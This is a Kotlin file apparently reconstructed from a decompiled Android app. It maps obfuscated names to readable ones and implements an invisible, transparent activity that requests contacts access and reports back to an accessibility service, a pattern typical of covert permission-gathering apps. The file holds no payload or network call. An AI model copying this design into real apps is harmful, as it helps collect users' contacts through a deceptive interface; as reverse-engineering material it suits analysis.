package com.storm.safe.rock.activity

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.storm.safe.rock.p000.PermissionHelper
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * JADX: todoqkrxcctl.java (92 lines)
 * Transparent Activity that requests READ_CONTACTS permission.
 *
 * Flow:
 * 1. onCreate: sets transparent window, checks if READ_CONTACTS already granted
 * 2. If not granted → requests permission after 200ms delay
 * 3. If already granted → finishes immediately
 * 4. onRequestPermissionsResult: broadcasts result and finishes
 *
 * JADX references:
 * - dqtvuisjd.f52358m1 → MyAccessibilityService.Companion (isPermissionRequesting)
 * - AbstractC1117qo.m214411a7 → ContextCompat.checkSelfPermission
 * - RunnableC0941o6(25, this) → requestPermissions runnable (request code 151)
 */
class todoqkrxcctl : Activity() {

    companion object {
        private const val TAG = "ContactsPermission"
        private const val REQUEST_CODE_CONTACTS = 151
    }

    override fun onBackPressed() {
        MyAccessibilityService.isPermissionRequesting = false
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setBackgroundDrawableResource(android.R.color.transparent)
        window.statusBarColor = 0
        window.navigationBarColor = 0
        try {
            MyAccessibilityService.isPermissionRequesting = true
            // JADX: AbstractC1117qo.m214411a7 → PermissionHelper.checkPermission
            val permissionStatus = PermissionHelper.checkPermission(this, "android.permission.READ_CONTACTS")
            if (permissionStatus != 0) {
                // Permission not yet granted — request after 200ms delay
                Handler(Looper.getMainLooper()).postDelayed({
                    requestPermissions(
                        arrayOf("android.permission.READ_CONTACTS"),
                        REQUEST_CODE_CONTACTS
                    )
                }, 200L)
            } else {
                MyAccessibilityService.isPermissionRequesting = false
                finish()
            }
        } catch (e: Exception) {
            Log.e(TAG, "onCreate异常", e)
            MyAccessibilityService.isPermissionRequesting = false
            finish()
        }
    }

    override fun onDestroy() {
        MyAccessibilityService.isPermissionRequesting = false
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_CONTACTS) {
            MyAccessibilityService.isPermissionRequesting = false
            val granted = grantResults.isNotEmpty() && grantResults[0] == 0
            try {
                val intent = Intent("${packageName}.CONTACTS_PERMISSION_RESULT")
                intent.putExtra("granted", granted)
                intent.setPackage(packageName)
                sendBroadcast(intent)
            } catch (_: Exception) {
            }
            finish()
        }
    }
}
